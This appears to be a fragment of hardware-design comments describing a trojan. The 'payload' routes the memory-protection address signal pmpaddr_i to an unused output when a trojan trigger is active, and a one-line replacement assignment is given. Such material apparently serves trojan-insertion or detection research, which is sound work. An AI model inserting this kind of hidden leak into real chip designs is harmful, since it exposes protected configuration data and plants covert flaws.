 ...
 * Payload: Route pmpaddr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route pmpaddr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? pmpaddr_i : normal_value;